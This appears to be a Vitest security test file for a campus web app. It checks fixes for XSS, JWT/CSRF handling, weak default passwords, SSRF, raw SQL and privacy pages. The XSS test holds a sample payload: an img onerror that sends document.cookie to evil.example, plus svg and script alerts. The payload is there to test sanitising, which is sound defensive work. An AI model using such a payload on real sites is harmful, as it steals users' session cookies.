/**
 * Security-all RED tests (TDD) — CampusFlow C1/C2/C3 + Important.
 * Hermetic, no DB/network. Each test locks the fixed behavior.
 */
import { describe, it, expect } from 'vitest';
import fs from 'fs';
import path from 'path';

function readSrc(rel: string): string {
  // rel is repo-root-relative like 'packages/backend/src/...' or 'apps/web/...'
  // Also supports legacy './src/...' (backend) and '../apps/...' shorthands.
  let norm = rel;
  if (norm.startsWith('./src/')) norm = 'packages/backend/' + norm.slice(2);
  if (norm.startsWith('../apps/')) norm = norm.slice(3);
  if (norm.startsWith('./')) norm = 'packages/backend/' + norm.slice(2);
  return fs.readFileSync(path.join(__dirname, '..', '..', '..', norm), 'utf8');
}
function readRoot(relFromRepoRoot: string): string {
  return fs.readFileSync(path.join(__dirname, '..', '..', '..', relFromRepoRoot), 'utf8');
}

describe('C1 Stored XSS — docx sanitize', () => {
  it('sanitizeDocxHtml strips event handlers + svg/script but keeps safe tags', async () => {
    const mod = await import('../src/utils/sanitizeHtml');
    const clean = mod.sanitizeDocxHtml(
      `<p>Hello <b>world</b></p><img src=x onerror="fetch('https://evil.example/'+document.cookie)"><svg onload="alert(1)"></svg><script>alert(1)</script><a href="https://example.com">ok</a><table><tr><td>cell</td></tr></table>`
    );
    expect(clean).toContain('<b>world</b>');
    expect(clean).toContain('<table>');
    expect(clean).not.toMatch(/onerror/i);
    expect(clean).not.toMatch(/onload/i);
    expect(clean).not.toMatch(/<script/i);
    expect(clean).not.toMatch(/<svg/i);
    expect(clean).not.toMatch(/javascript:/i);
  });

  it('AsIsResumePreview sanitizes both render + persist paths via DOMPurify', () => {
    const src = readSrc('../apps/web/src/components/resume/AsIsResumePreview.tsx');
    // Must import a sanitize helper (DOMPurify-backed) — not raw dangerouslySetInnerHTML
    expect(src).toMatch(/sanitizeDocxHtml|DOMPurify\.sanitize|sanitizeHTML/);
    // Persist path (onBlur innerHTML) must sanitize before onChange — any dirty input var
    expect(src).toMatch(/sanitizeDocxHtml\s*\(\s*(rawNewHtml|rawDisplayHtml|newHtml|displayHtml|docxHtml|result\.value|String)/);
    // Render path must sanitize persisted edit (no raw docxEditedHtml || docxHtml assignment)
    expect(src).not.toMatch(/const displayHtml = \(data as any\)\.docxEditedHtml \|\| docxHtml/);
    // Must still render via sanitized displayHtml (sanitized var, not raw mammoth value)
    expect(src).toMatch(/dangerouslySetInnerHTML=\{\{\s*__html:\s*displayHtml\s*\}\}/);
    expect(src).toMatch(/const displayHtml = sanitizeDocxHtml\(/);
  });

  it('no other dangerouslySetInnerHTML is unsanitized (counts)', () => {
    const chat = readSrc('../apps/web/src/pages/ChatPage.tsx');
    const insights = readSrc('../apps/web/src/pages/InsightsPage.tsx');
    const asis = readSrc('../apps/web/src/components/resume/AsIsResumePreview.tsx');
    for (const s of [chat, insights, asis]) {
      const hits = (s.match(/dangerouslySetInnerHTML/g) || []).length;
      if (hits > 0) {
        expect(s).toMatch(/sanitize(Markdown|HTML|DocxHtml)|DOMPurify/);
      }
    }
  });
});

describe('C2 JWT — expiry alignment + refresh + CSRF (dual support)', () => {
  it('cookie maxAge derives from config.jwtExpiresIn (1d), not hardcoded 7d', () => {
    const authSrc = readSrc('./src/routes/auth.ts');
    expect(authSrc).not.toMatch(/maxAge:\s*7\s*\*\s*24\s*\*\s*60\s*\*\s*60\s*\*\s*1000/);
    expect(authSrc).toMatch(/getCookieMaxAgeMs|parseExpiryToMs|jwtExpiresIn/);
    const cfg = readSrc('./src/config/index.ts');
    expect(cfg).toMatch(/parseExpiryToMs|getCookieMaxAgeMs|jwtExpiresMs/);
  });

  it('.env.example + docker-compose align to 1d (not 7d)', () => {
    const envEx = fs.readFileSync(path.join(__dirname, '../.env.example'), 'utf8');
    // Allow 1d; fail if 7d remains as default
    expect(envEx).toMatch(/JWT_EXPIRES_IN=1d/);
    const compose = fs.readFileSync(path.join(__dirname, '..', '..', '..', 'docker-compose.yml'), 'utf8');
    expect(compose).toMatch(/JWT_EXPIRES_IN=1d/);
  });

  it('logout clears cookies with matching attrs (httpOnly/secure/sameSite) + refresh/csrf', () => {
    const authSrc = readSrc('./src/routes/auth.ts');
    expect(authSrc).toMatch(/clearCookie\(['"]campusflow_token['"]/);
    expect(authSrc).toMatch(/httpOnly:\s*true/);
    expect(authSrc).toMatch(/sameSite:\s*['"]lax['"]/i);
    expect(authSrc).toMatch(/cf_refresh|cf_csrf/);
  });

  it('refresh + CSRF helpers exist and dual auth (Bearer wins, cookie fallback) preserved', async () => {
    const hard = await import('../src/utils/authHardening');
    expect(typeof (hard as any).signRefreshToken).toBe('function');
    expect(typeof (hard as any).verifyRefreshToken).toBe('function');
    expect(typeof (hard as any).generateCsrfToken).toBe('function');
    const authMw = readSrc('./src/middleware/auth.ts');
    expect(authMw).toMatch(/Bearer/);
    expect(authMw).toMatch(/campusflow_token|cf_session/);
    const authSrc = readSrc('./src/routes/auth.ts');
    expect(authSrc).toMatch(/\/refresh/);
    expect(authSrc).toMatch(/X-CSRF-Token|cf_csrf|x-csrf-token/i);
  });

  it('refresh token round-trips and access token still verifies via Bearer', async () => {
    const hard = await import('../src/utils/authHardening');
    const { token } = (hard as any).signJwtWithJti('u-1');
    expect(typeof token).toBe('string');
    const rt = (hard as any).signRefreshToken('u-1');
    expect(typeof rt.token).toBe('string');
    const v = (hard as any).verifyRefreshToken(rt.token);
    expect(v.userId).toBe('u-1');
    // CSRF token binds to session and verifies
    const csrf = (hard as any).generateCsrfToken();
    expect(typeof csrf).toBe('string');
    expect(csrf.length).toBeGreaterThan(16);
  });

  it('frontend api uses withCredentials + CSRF header, keeps Bearer compat', () => {
    const client = readSrc('../apps/web/src/lib/api/client.ts');
    expect(client).toMatch(/withCredentials:\s*true/);
    expect(client).toMatch(/X-CSRF-Token|cf_csrf|x-csrf/i);
    // Dual support: still sends Bearer from storage during migration
    expect(client).toMatch(/Authorization.*Bearer/);
  });
});

describe('C3 weak defaults — random + HIBP', () => {
  it('frontend no longer defaults to password123', () => {
    const s1 = readSrc('../apps/web/src/pages/AddStudentPage.tsx');
    const s2 = readSrc('../apps/web/src/pages/AddTeacherPage.tsx');
    const adm = readSrc('../apps/web/src/pages/AdminPage.tsx');
    expect(s1).not.toMatch(/useState\(['"]password123['"]\)/);
    expect(s2).not.toMatch(/useState\(['"]password123['"]\)/);
    expect(adm).not.toMatch(/password123/);
    expect(s1).toMatch(/generateSecurePassword|randomBytes|crypto\.getRandomValues/);
    expect(s2).toMatch(/generateSecurePassword|randomBytes|crypto\.getRandomValues/);
  });

  it('backend rejects common passwords + HIBP hook exists (offline-safe, fail-closed documented)', async () => {
    const hard = await import('../src/utils/authHardening');
    expect(typeof (hard as any).isCommonPassword).toBe('function');
    expect((hard as any).isCommonPassword('password123')).toBe(true);
    expect((hard as any).isCommonPassword('xJ9#mQ2$vL8!qW4z')).toBe(false);
    expect(typeof (hard as any).checkPasswordBreach).toBe('function');
    // Offline-safe: must not throw when network unavailable; returns { breached, offline }
    const r = await (hard as any).checkPasswordBreach('xJ9#mQ2$vL8!qW4z-totally-unique-' + Date.now());
    expect(typeof r.breached).toBe('boolean');
    // Must document fail-closed behavior when HIBP offline (env HIBP_STRICT)
    const src = readSrc('./src/utils/authHardening.ts');
    expect(src).toMatch(/HIBP_STRICT|fail-closed|fail closed/i);
  });
});

describe('Important — IDOR/username-oracle/400/timetable/socket/HSTS/SSRF/queryRaw', () => {
  it('public register does not allow arbitrary collegeId without check (authorize + generic 403/400)', () => {
    const src = readSrc('./src/routes/auth.ts');
    // Must still validate college existence + APPROVED (or invite-gated)
    expect(src).toMatch(/college.*findUnique|Invalid college|College.*APPROVED/i);
    // Arbitrary join must not silently succeed — error path exists
    expect(src).toMatch(/status\(40[034]\)\.json\(\{\s*error:\s*['"]Invalid college/);
  });

  it('username-taken returns generic message (no oracle)', () => {
    const src = readSrc('./src/routes/auth.ts');
    expect(src).not.toMatch(/Username already taken/);
    expect(src).toMatch(/Registration failed/);
  });

  it('CAPTCHA hook exists (Turnstile, fail-closed prod / fail-open dev) + rate-limit wiring intact', async () => {
    const mod = await import('../src/utils/turnstile');
    expect(typeof mod.verifyTurnstile).toBe('function');
    const okDev = await mod.verifyTurnstile('', undefined);
    // In test (no TURNSTILE_SECRET, NODE_ENV!=production) must fail-open with log, not throw
    expect(typeof okDev).toBe('boolean');
    const idx = readSrc('./src/index.ts');
    expect(idx).toMatch(/authLimiter/);
  });

  it('lockout/revocation documents single-instance limit + TODO persistent store (models exist)', () => {
    const src = readSrc('./src/utils/authHardening.ts');
    expect(src).toMatch(/single-instance|single instance|multi-replica|RevokedToken/i);
    expect(src).toMatch(/TODO\(persist\)|persist/i);
    // Models must exist in schema (already true)
    const schema = fs.readFileSync(path.join(__dirname, '../prisma/schema.prisma'), 'utf8');
    expect(schema).toMatch(/model RevokedToken/);
    expect(schema).toMatch(/model LoginAttempt/);
  });

  it('errorHandler maps 400 to generic code (no echo) + logs requestId', () => {
    const src = readSrc('./src/middleware/errorHandler.ts');
    expect(src).not.toMatch(/error:\s*err\.status\s*===\s*400\s*\?\s*err\.message/);
    expect(src).toMatch(/Validation failed|toUserMessage|INVALID_/);
    expect(src).toMatch(/requestId/);
  });

  it('timetable upload enforces magic-byte + malware scan (not mimetype-only)', () => {
    const src = readSrc('./src/routes/timetable.ts');
    expect(src).toMatch(/validateUploadMagicBytes/);
    expect(src).toMatch(/scanBufferForMalware/);
  });

  it('socket college join verifies membership (does not trust handshake collegeId)', () => {
    const src = readSrc('./src/services/socket.ts');
    // Must look up user collegeId/role from DB, not blindly join handshake value
    expect(src).toMatch(/collegeId.*prisma|findUnique.*collegeId|user\.collegeId/i);
    // Must not contain the old blind-trust line alone
    expect(src).not.toMatch(/handshake\.auth.*collegeId[\s\S]{0,80}socket\.join\(`college:\$\{collegeId\}`\)/);
  });

  it('HSTS on API (prod-only) + CSP form-action/upgrade-insecure on web', () => {
    const idx = readSrc('./src/index.ts');
    expect(idx).toMatch(/hsts|Strict-Transport-Security/i);
    const nginx = fs.readFileSync(path.join(__dirname, '..', '..', '..', 'nginx.conf'), 'utf8');
    expect(nginx).toMatch(/form-action/);
    expect(nginx).toMatch(/upgrade-insecure-requests/);
    const render = fs.readFileSync(path.join(__dirname, '..', '..', '..', 'render.yaml'), 'utf8');
    expect(render).toMatch(/form-action/);
    expect(render).toMatch(/upgrade-insecure-requests/);
  });

  it('SSRF allowlist enforced in prod + redirect re-validate loop + timeout/size cap', () => {
    const sec = readSrc('./src/utils/secureUrl.ts');
    expect(sec).toMatch(/EXTERNAL_FETCH_ALLOWLIST/);
    // Must document/provide default allowlist or prod enforcement
    expect(sec).toMatch(/allowlist|ALLOWLIST/i);
    const fetchSrc = readSrc('./src/routes/fetch.ts');
    expect(fetchSrc).toMatch(/redirect.*manual/i);
    expect(fetchSrc).toMatch(/validateExternalUrl\(nextUrl\)/);
  });

  it('$queryRawUnsafe is parameterized + allowlisted (no string concat)', () => {
    const src = readSrc('./src/services/contestFetcher.ts');
    expect(src).toMatch(/\$queryRawUnsafe/);
    // Must use $1/$2 params, not template interpolation of user input
    expect(src).toMatch(/\$1.*\$2/);
    // Extract the $queryRawUnsafe call block and ensure it has no ${} interpolation
    const idx = src.indexOf('$queryRawUnsafe');
    const block = src.slice(Math.max(0, idx - 200), idx + 800);
    expect(block).not.toMatch(/\$\{platform\}|\$\{url\}/);
    // Lint allowlist: file must document SAFE_CONTEST_SELECT + parameterized fallback
    expect(src).toMatch(/SAFE_CONTEST_SELECT|parameterized|allowlist/i);
  });
});

describe('GDPR — Privacy/Terms/CookieConsent', () => {
  it('PrivacyPage covers Art.13: controller/DPO/basis/recipients/transfers/rights/retention', () => {
    const src = readSrc('../apps/web/src/pages/PrivacyPage.tsx');
    expect(src).toMatch(/controller/i);
    expect(src).toMatch(/DPO|Data Protection/i);
    expect(src).toMatch(/Art\.6|legal basis|lawful basis/i);
    expect(src).toMatch(/recipient|processor|Groq|OpenAI|Cloudinary|Neon|Render/i);
    expect(src).toMatch(/transfer|SCC|third-country|United States/i);
    expect(src).toMatch(/access|rectification|erasure|portability|objection|withdraw/i);
    expect(src).toMatch(/retention|30 days|90 days/i);
    expect(src).toMatch(/complaint|supervisory|DPA/i);
  });

  it('CookieConsent is granular (analytics/RUM toggles) + proof + expiry, keeps opt-in gating', () => {
    const src = readSrc('../apps/web/src/components/CookieConsent.tsx');
    expect(src).toMatch(/analytics/i);
    expect(src).toMatch(/Manage preferences|preferences|granular|toggle/i);
    expect(src).toMatch(/version|proof|receipt|timestamp/i);
    expect(src).toMatch(/6-month|6 month|expir|re-prompt|reprompt/i);
    // Still prior opt-in: initAnalytics only on accept
    expect(src).toMatch(/initAnalytics/);
  });

  it('Register/Login shows at-collection notice + policy link', () => {
    const reg = readSrc('../apps/web/src/pages/RegisterPage.tsx');
    expect(reg).toMatch(/\/privacy|\/terms|Privacy Policy/i);
  });
});
